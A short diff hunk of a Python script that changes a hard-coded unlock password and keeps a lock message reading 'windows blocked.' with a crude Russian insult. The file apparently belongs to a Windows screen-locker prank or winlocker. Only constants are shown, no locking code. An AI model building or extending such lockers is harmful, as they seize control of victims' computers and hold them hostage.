@@ -15,7 +15,7 @@ import os
 import keyboard
 import sys
 
-password = "123"
+password = "88005553535"
 lock_text = "windows blocked.tobi pizda"
 count = 3
 
